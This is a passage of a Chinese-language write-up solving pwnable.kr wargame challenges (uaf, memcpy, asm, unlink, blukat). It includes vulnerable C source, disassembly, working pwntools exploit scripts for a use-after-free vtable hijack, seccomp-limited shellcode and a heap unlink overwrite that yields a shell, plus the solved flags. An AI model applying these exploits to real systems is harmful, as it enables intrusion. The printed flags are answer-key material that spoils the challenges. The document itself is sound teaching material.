 RAX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
 RBX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
```

查看`0x401570`地址的内容，可以知道`Man`类的`introduce()`函数起始地址是`0x4012d2`。

```assembly
pwndbg> x/4x 0x401570
0x401570 <vtable for Man+16>:   0x0040117a      0x00000000      0x004012d2      0x00000000
```

所以我们可以申请一定内存，并写入一些数据让程序在执行选项`1`中的`introduce()`函数的时候实际调用`give_shell()`。

`m->introduce()`函数的工作方式是先访问虚函数表（`vtable`）的地址`0x401570`，此时它会找到`introduce()`和`give_shell()`这两个函数的地址，并且会调用`*vtable_address+8`，因此我们可以设置`vtable_address = vtable_address - 8 = 0x401570 - 8 = 0x401568`来让程序执行`give_shell()`。编写`Python`代码求解，获得`shell`后输入`cat flag`拿到`yay_f1ag_aft3r_pwning`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
shell = ssh(user='uaf', host='pwnable.kr', port=2222, password='guest')
# shell.download("/home/uaf/uaf", "./uaf")
io = shell.process(executable='./uaf', argv=['uaf', '24', '/dev/stdin'])
io.sendlineafter('free\n', b'3')
io.sendlineafter('free\n', b'2')
# payload = b'\x68\x15\x40\x00\x00\x00\x00\x00'  # 0x401568
payload = p64(0x401568)
io.sendline(payload)
io.sendlineafter('free\n', b'2')
io.sendline(payload)
io.sendlineafter('free\n', b'1')
io.interactive()
```

------

### memcpy

这是**Pwnable.kr**的第十七个挑战`memcpy`，来自**[Toddler's Bottle]**部分。

```bash
Are you tired of hacking?, take some rest here.
Just help me out with my small experiment regarding memcpy performance. 
after that, flag is yours.

http://pwnable.kr/bin/memcpy.c

ssh memcpy@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh memcpy@pwnable.kr -p2222
memcpy@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 13:49:58 2023 from 147.235.209.41
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
memcpy@pwnable:~$ ls -la
total 28
drwxr-x---   5 root memcpy 4096 Oct 23  2016 .
drwxr-xr-x 117 root root   4096 Nov 10  2022 ..
d---------   2 root root   4096 Mar  4  2016 .bash_history
dr-xr-xr-x   2 root root   4096 Jul 13  2016 .irssi
-rw-r--r--   1 root root   3172 Mar  4  2016 memcpy.c
drwxr-xr-x   2 root root   4096 Oct 23  2016 .pwntools-cache
-rw-r--r--   1 root root    192 Mar 10  2016 readme
```

用户`memcpy`拥有权限的文件只有两个：`memcpy.c`和`readme`。

```bash
memcpy@pwnable:~$ cat readme
the compiled binary of "memcpy.c" source code (with real flag) will be executed under memcpy_pwn privilege if you connect to port 9022.
execute the binary by connecting to daemon(nc 0 9022).
```

如果`nc`连接到`9022`端口，则`memcpy.c`源代码编译的二进制文件（含有flag）将在`memcpy_pwn`权限下执行。看下`memcpy.c`的源代码：

```c
memcpy@pwnable:~$ cat memcpy.c
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
    asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
    int i;
    for (i=0; i<len; i++) {
        dest[i] = src[i];
    }
    return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
    size_t i;
    // 64-byte block fast copy
    if(len >= 64){
        i = len / 64;
        len &= (64-1);
        while(i-- > 0){
            __asm__ __volatile__ (
            "movdqa (%0), %%xmm0\n"
            "movdqa 16(%0), %%xmm1\n"
            "movdqa 32(%0), %%xmm2\n"
            "movdqa 48(%0), %%xmm3\n"
            "movntps %%xmm0, (%1)\n"
            "movntps %%xmm1, 16(%1)\n"
            "movntps %%xmm2, 32(%1)\n"
            "movntps %%xmm3, 48(%1)\n"
            ::"r"(src),"r"(dest):"memory");
            dest += 64;
            src += 64;
        }
    }
    // byte-to-byte slow copy
    if(len) slow_memcpy(dest, src, len);
    return dest;
}

int main(void){

    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    printf("Hey, I have a boring assignment for CS class.. :(\n");
    printf("The assignment is simple.\n");

    printf("-----------------------------------------------------\n");
    printf("- What is the best implementation of memcpy?        -\n");
    printf("- 1. implement your own slow/fast version of memcpy -\n");
    printf("- 2. compare them with various size of data         -\n");
    printf("- 3. conclude your experiment and submit report     -\n");
    printf("-----------------------------------------------------\n");

    printf("This time, just help me out with my experiment and get flag\n");
    printf("No fancy hacking, I promise :D\n");

    unsigned long long t1, t2;
    int e;
    char* src;
    char* dest;
    unsigned int low, high;
    unsigned int size;
    // allocate memory
    char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    size_t sizes[10];
    int i=0;

    // setup experiment parameters
    for(e=4; e<14; e++){    // 2^13 = 8K
        low = pow(2,e-1);
        high = pow(2,e);
        printf("specify the memcpy amount between %d ~ %d : ", low, high);
        scanf("%d", &size);
        if( size < low || size > high ){
                printf("don't mess with the experiment.\n");
                exit(0);
        }
        sizes[i++] = size;
    }

    sleep(1);
    printf("ok, lets run the experiment with your configuration\n");
    sleep(1);

    // run experiment
    for(i=0; i<10; i++){
        size = sizes[i];
        printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
        dest = malloc( size );

        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
        t1 = rdtsc();
        slow_memcpy(dest, src, size);           // byte-to-byte memcpy
        t2 = rdtsc();
        printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
        t1 = rdtsc();
        fast_memcpy(dest, src, size);           // block-to-block memcpy
        t2 = rdtsc();
        printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
        printf("\n");
    }

    printf("thanks for helping my experiment!\n");
    printf("flag : ----- erased in this source code -----\n");
    return 0;
}
```

在用户根据提示输入`10`个数字分配内存后，该程序会使用`malloc()`函数为每个输入的数据在堆上申请堆块，然后以`memcpy()`为中介计算，比较`slow_memcpy()`和`fast_memcpy()`这两个函数耗费的时间。其中，`slow_memcpy()` 使用的是循环赋值，`fast_memcpy()` 使用的是汇编指令 `movdqa` 和 `movntps` 进行复制。程序会在所有数字拷贝成功后输出`flag`。

`nc 0 9022`简单测试了一下发现遇到了错误，出现的错误是由于`fast_memcpy()`函数中的`moventps`引起的。`moventps`要求操作数按 `16` 字节对齐。但是，参数`dest`的地址可能未对齐到 `16` 字节，这具体取决于用户输入的大小。`C` 语言中的 `malloc(n)` 实际分配的堆内存是 `Header(4 字节) + n` 结构，即分配 `n + 4` 字节的空间，返回给用户的是 `n` 部分的首地址。我们只需要找出`10`个符合输入范围且可以做到`16`字节对齐的数字即可得到`flag`：`1_w4nn4_br34K_th3_m3m0ry_4lignm3nt`。

```bash
memcpy@pwnable:~$ nc 0 9022
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16 : 12
specify the memcpy amount between 16 ~ 32 : 28
specify the memcpy amount between 32 ~ 64 : 60
specify the memcpy amount between 64 ~ 128 : 124
specify the memcpy amount between 128 ~ 256 : 252
specify the memcpy amount between 256 ~ 512 : 508
specify the memcpy amount between 512 ~ 1024 : 1020
specify the memcpy amount between 1024 ~ 2048 : 2044
specify the memcpy amount between 2048 ~ 4096 : 4092
specify the memcpy amount between 4096 ~ 8192 : 8188
ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 12
ellapsed CPU cycles for slow_memcpy : 5268
ellapsed CPU cycles for fast_memcpy : 576

experiment 2 : memcpy with buffer size 28
ellapsed CPU cycles for slow_memcpy : 634
ellapsed CPU cycles for fast_memcpy : 420

experiment 3 : memcpy with buffer size 60
ellapsed CPU cycles for slow_memcpy : 1010
ellapsed CPU cycles for fast_memcpy : 994

experiment 4 : memcpy with buffer size 124
ellapsed CPU cycles for slow_memcpy : 1782
ellapsed CPU cycles for fast_memcpy : 1070

experiment 5 : memcpy with buffer size 252
ellapsed CPU cycles for slow_memcpy : 3648
ellapsed CPU cycles for fast_memcpy : 1064

experiment 6 : memcpy with buffer size 508
ellapsed CPU cycles for slow_memcpy : 6628
ellapsed CPU cycles for fast_memcpy : 1218

experiment 7 : memcpy with buffer size 1020
ellapsed CPU cycles for slow_memcpy : 13552
ellapsed CPU cycles for fast_memcpy : 1386

experiment 8 : memcpy with buffer size 2044
ellapsed CPU cycles for slow_memcpy : 25978
ellapsed CPU cycles for fast_memcpy : 2078

experiment 9 : memcpy with buffer size 4092
ellapsed CPU cycles for slow_memcpy : 52416
ellapsed CPU cycles for fast_memcpy : 2830

experiment 10 : memcpy with buffer size 8188
ellapsed CPU cycles for slow_memcpy : 116424
ellapsed CPU cycles for fast_memcpy : 4690

thanks for helping my experiment!
flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
```

简洁的一行：

```bash
memcpy@pwnable:~$ echo "12 28 60 124 252 508 1020 2044 4092 8188" | nc 0 9022
```

------

### asm

这是**Pwnable.kr**的第十八个挑战`asm`，来自**[Toddler's Bottle]**部分。

```bash
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh asm@pwnable.kr -p2222
asm@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 14:35:57 2023 from 147.235.217.79
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
asm@pwnable:~$ ls -la
total 48
drwxr-x---   5 root asm   4096 Jan  2  2017 .
drwxr-xr-x 117 root root  4096 Nov 10  2022 ..
-rwxr-xr-x   1 root root 13704 Nov 29  2016 asm
-rw-r--r--   1 root root  1793 Nov 29  2016 asm.c
d---------   2 root root  4096 Nov 19  2016 .bash_history
dr-xr-xr-x   2 root root  4096 Nov 25  2016 .irssi
drwxr-xr-x   2 root root  4096 Jan  2  2017 .pwntools-cache
-rw-r--r--   1 root root   211 Nov 19  2016 readme
-rw-r--r--   1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

我们可以看到四个文件`readme`、`asm`、`asm.c`和`this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`，其中`asm`是`ELF`二进制可执行文件，`asm.c`是编译二进制文件的`C`代码，用户`asm`没有权限直接查看这个名字很长的`flag`文件中的内容。输入`cat readme`来查看提示：

```bash
asm@pwnable:~$ cat readme
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
```

一旦`nc`连接到`9026`端口，`asm.c`源代码编译的二进制文件`asm`（含有flag）将在`asm_pwn`权限下执行。查看`asm.c`的源代码：

```c
asm@pwnable:~$ cat asm.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
        printf("seccomp error\n");
        exit(0);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    if (seccomp_load(ctx) < 0){
        seccomp_release(ctx);
        printf("seccomp error\n");
        exit(0);
    }
    seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    printf("Welcome to shellcoding practice challenge.\n");
    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
    printf("If this does not challenge you. you should play 'asg' challenge :)\n");

    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
    memset(sh, 0x90, 0x1000);
    memcpy(sh, stub, strlen(stub));

    int offset = sizeof(stub);
    printf("give me your x64 shellcode: ");
    read(0, sh+offset, 1000);

    alarm(10);
    chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
    sandbox();
    ((void (*)(void))sh)();
    return 0;
}
```

审计代码后发现，我们需要用汇编代码构成`shellcode`来读取`flag`。

编写`Python`代码进行求解，得到`flag`：`Mak1ng_shelLcodE_i5_veRy_eaSy`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwnable.kr', 9026)
filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
shellcode = shellcraft.open(filename)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
shellcode += shellcraft.exit(0)
payload = asm(shellcode)
io.recvuntil('give me your x64 shellcode: ')
io.sendline(payload)
flag = io.recv()
log.success(flag)
# Mak1ng_shelLcodE_i5_veRy_eaSy
# lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo
io.close()
```

------

### unlink

这是**Pwnable.kr**的第十九个挑战`unlink`，来自**[Toddler's Bottle]**部分。

```bash
Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh unlink@pwnable.kr -p2222
unlink@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 09:50:45 2023 from 12.249.36.98
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
unlink@pwnable:~$ ls -la
total 40
drwxr-x---   5 root unlink     4096 Nov 28  2016 .
drwxr-xr-x 117 root root       4096 Nov 10  2022 ..
d---------   2 root root       4096 Nov 23  2016 .bash_history
-r--r-----   1 root unlink_pwn   49 Nov 23  2016 flag
-rw-r-----   1 root unlink_pwn  543 Nov 28  2016 intended_solution.txt
dr-xr-xr-x   2 root root       4096 Nov 25  2016 .irssi
drwxr-xr-x   2 root root       4096 Nov 23  2016 .pwntools-cache
-r-xr-sr-x   1 root unlink_pwn 7540 Nov 23  2016 unlink
-rw-r--r--   1 root root        749 Nov 23  2016 unlink.c
```

我们可以看到四个关键文件：`flag`，`intended_solution.txt`，`unlink` ，`unlink.c`，然而用户`unlink`是没有权限查看`flag`和`intended_solution.txt`的。查看`unlink.c`的源代码。

```c
unlink@pwnable:~$ cat unlink.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
}OBJ;

void shell(){
    system("/bin/sh");
}

void unlink(OBJ* P){
    OBJ* BK;
    OBJ* FD;
    BK=P->bk;
    FD=P->fd;
    FD->bk=BK;
    BK->fd=FD;
}
int main(int argc, char* argv[]){
    malloc(1024);
    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A <-> B <-> C
    A->fd = B;
    B->bk = A;
    B->fd = C;
    C->bk = B;

    printf("here is stack address leak: %p\n", &A);
    printf("here is heap address leak: %p\n", A);
    printf("now that you have leaks, get shell!\n");
    // heap overflow!
    gets(A->buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
```

使用`gdb`进一步分析程序。

```assembly
unlink@pwnable:~$ gdb ./unlink
(gdb) set disassembly-flavor intel  # Intel Style
(gdb) disassemble shell
Dump of assembler code for function shell:
   0x080484eb <+0>:     push   ebp     # shell函数的起始地址 
   0x080484ec <+1>:     mov    ebp,esp
   0x080484ee <+3>:     sub    esp,0x8
   0x080484f1 <+6>:     sub    esp,0xc
   0x080484f4 <+9>:     push   0x8048690
   0x080484f9 <+14>:    call   0x80483c0 <system@plt>
   0x080484fe <+19>:    add    esp,0x10
   0x08048501 <+22>:    nop
   0x08048502 <+23>:    leave  
   0x08048503 <+24>:    ret    
End of assembler dump.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804852f <+0>:     lea    ecx,[esp+0x4]
   0x08048533 <+4>:     and    esp,0xfffffff0
   0x08048536 <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048539 <+10>:    push   ebp
   0x0804853a <+11>:    mov    ebp,esp
   0x0804853c <+13>:    push   ecx
   0x0804853d <+14>:    sub    esp,0x14
   0x08048540 <+17>:    sub    esp,0xc
   0x08048543 <+20>:    push   0x400
   0x08048548 <+25>:    call   0x80483a0 <malloc@plt>
   0x0804854d <+30>:    add    esp,0x10
   0x08048550 <+33>:    sub    esp,0xc
   0x08048553 <+36>:    push   0x10
   0x08048555 <+38>:    call   0x80483a0 <malloc@plt>
   0x0804855a <+43>:    add    esp,0x10
   0x0804855d <+46>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048560 <+49>:    sub    esp,0xc
   0x08048563 <+52>:    push   0x10
   0x08048565 <+54>:    call   0x80483a0 <malloc@plt>
   0x0804856a <+59>:    add    esp,0x10
   0x0804856d <+62>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048570 <+65>:    sub    esp,0xc
   0x08048573 <+68>:    push   0x10
   0x08048575 <+70>:    call   0x80483a0 <malloc@plt>
   0x0804857a <+75>:    add    esp,0x10
   0x0804857d <+78>:    mov    DWORD PTR [ebp-0x10],eax
   0x08048580 <+81>:    mov    eax,DWORD PTR [ebp-0x14]
   0x08048583 <+84>:    mov    edx,DWORD PTR [ebp-0xc]
   0x08048586 <+87>:    mov    DWORD PTR [eax],edx
   0x08048588 <+89>:    mov    edx,DWORD PTR [ebp-0x14]
   0x0804858b <+92>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804858e <+95>:    mov    DWORD PTR [eax+0x4],edx
   0x08048591 <+98>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048594 <+101>:   mov    edx,DWORD PTR [ebp-0x10]
   0x08048597 <+104>:   mov    DWORD PTR [eax],edx
   0x08048599 <+106>:   mov    eax,DWORD PTR [ebp-0x10]
   0x0804859c <+109>:   mov    edx,DWORD PTR [ebp-0xc]
   0x0804859f <+112>:   mov    DWORD PTR [eax+0x4],edx
   0x080485a2 <+115>:   sub    esp,0x8
   0x080485a5 <+118>:   lea    eax,[ebp-0x14]
   0x080485a8 <+121>:   push   eax
   0x080485a9 <+122>:   push   0x8048698
   0x080485ae <+127>:   call   0x8048380 <printf@plt>
   0x080485b3 <+132>:   add    esp,0x10
   0x080485b6 <+135>:   mov    eax,DWORD PTR [ebp-0x14]
   0x080485b9 <+138>:   sub    esp,0x8
   0x080485bc <+141>:   push   eax
   0x080485bd <+142>:   push   0x80486b8
   0x080485c2 <+147>:   call   0x8048380 <printf@plt>
   0x080485c7 <+152>:   add    esp,0x10
   0x080485ca <+155>:   sub    esp,0xc
   0x080485cd <+158>:   push   0x80486d8
   0x080485d2 <+163>:   call   0x80483b0 <puts@plt>
   0x080485d7 <+168>:   add    esp,0x10
   0x080485da <+171>:   mov    eax,DWORD PTR [ebp-0x14]
   0x080485dd <+174>:   add    eax,0x8
   0x080485e0 <+177>:   sub    esp,0xc
   0x080485e3 <+180>:   push   eax
   0x080485e4 <+181>:   call   0x8048390 <gets@plt>
   0x080485e9 <+186>:   add    esp,0x10
   0x080485ec <+189>:   sub    esp,0xc
   0x080485ef <+192>:   push   DWORD PTR [ebp-0xc]
   0x080485f2 <+195>:   call   0x8048504 <unlink>
   0x080485f7 <+200>:   add    esp,0x10
   0x080485fa <+203>:   mov    eax,0x0
   0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]   # $ecx的值由$ebp-4获得, 而$ebp的值在main运行过程中没变过
   0x08048602 <+211>:   leave  # 等效于mov esp ebp, pop ebp 对$esp最终的值无影响
   0x08048603 <+212>:   lea    esp,[ecx-0x4]   # $esp的值由$ecx-4获得
   0x08048606 <+215>:   ret    # ret相当于pop eip, 将$esp指向的地址放入到$eip中
End of assembler dump.
```

`shell()`函数的起始地址是`0x080484eb`。经过上述分析，我们可以构造`[exc-4] = 0x080484eb`从而劫持程序执行`shell()`。我们构造`Payload`时，可以先把`shell()`函数的起始地址写入到`A->buf`中并记作`shell_addr`，再让`$ecx`寄存器指向`shell_addr+4`（或者说是把`$ebp-4`中的内容覆盖为`shell_addr+4`）。因此`gets()`时输入的内容是`shell_addr + padding + B->fb + B->bk`。

![](https://paper.tanyaodan.com/Pwnable/kr/unlink/heap_struct.png)

编写`Python`代码求解，获得`shell`后输入`cat flag`拿到`conditional_write_what_where_from_unl1nk_explo1t`。

```python
from pwn import *

shell = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./unlink')
io.recvuntil('here is stack address leak: ')
stack_addr = int(io.recvline()[:-1], 16)
log.success('stack_addr => %s', hex(stack_addr))
io.recvuntil('here is heap address leak: ')
heap_addr = int(io.recvline()[:-1], 16)
shell_addr = 0x80484eb
payload = p32(shell_addr) + b'a'*12 + p32(heap_addr+0xc) + p32(stack_addr+0x10)
io.sendline(payload)
io.interactive()
```

------

### blukat

这是**Pwnable.kr**的第二十个挑战`blukat`，来自**[Toddler's Bottle]**部分。

```bash
Sometimes, pwnable is strange...
hint: if this challenge is hard, you are a skilled player.

ssh blukat@pwnable.kr -p2222 (pw: guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh blukat@pwnable.kr -p2222
blukat@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 10:50:24 2023 from 12.249.36.98
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
blukat@pwnable:~$ ls -la
total 36
drwxr-x---   4 root blukat     4096 Aug 16  2018 .
drwxr-xr-x 117 root root       4096 Nov 10  2022 ..
-r-xr-sr-x   1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r--   1 root root        645 Aug  8  2018 blukat.c
dr-xr-xr-x   2 root root       4096 Aug 16  2018 .irssi
-rw-r-----   1 root blukat_pwn   33 Jan  6  2017 password
drwxr-xr-x   2 root root       4096 Aug 16  2018 .pwntools-cache
```

可以看到三个文件`blukat`、`blukat.c`和`password`，其中`blukat`是`ELF`二进制可执行文件，`blukat.c`是编译二进制文件的`C`代码。

查看`blukat.c`的源代码。

```c
blukat@pwnable:~$ cat blukat.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
    int i;
    for(i=0; i<strlen(s); i++){
        flag[i] = s[i] ^ key[i];
    }
    printf("%s\n", flag);
}
int main(){
    FILE* fp = fopen("/home/blukat/password", "r");
    fgets(password, 100, fp);
    char buf[100];
    printf("guess the password!\n");
    fgets(buf, 128, stdin);
    if(!strcmp(password, buf)){
        printf("congrats! here is your flag: ");
        calc_flag(password);
    }
    else{
        printf("wrong guess!\n");
        exit(0);
    }
    return 0;
}
```

题目描述中给出了`hint: if this challenge is hard, you are a skilled player.`。查看用户信息：

```bash
blukat@pwnable:~$ id
uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)
blukat@pwnable:~$ groups blukat
blukat : blukat blukat_pwn
```

没想到这题`blukat`和`blukat_pwn`居然是同一个分组，那我们是不是有权限访问`password`呢？！

```bash
blukat@pwnable:~$ cat password
cat: password: Permission denied
blukat@pwnable:~$ file ./password
./password: ASCII text
blukat@pwnable:~$ xxd password
00000000: 6361 743a 2070 6173 7377 6f72 643a 2050  cat: password: P
00000010: 6572 6d69 7373 696f 6e20 6465 6e69 6564  ermission denied
00000020: 0a
```

好家伙！这题居然还假装我们没有访问权限，其实密码就是`cat: password: Permission denied`。

```bash
blukat@pwnable:~$ cat password | ./blukat
guess the password!
congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!
```

将密码输入到二进制文件`blukat`中，得到`flag`：`Pl3as_DonT_Miss_youR_GrouP_Perm!!`。

------

### horcruxes

这是**Pwnable.kr**的第二十一个挑战`horcruxes`，来自**[Toddler's Bottle]**部分。好家伙，`who-you-know`和他的魂器出现啦。

```bash
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

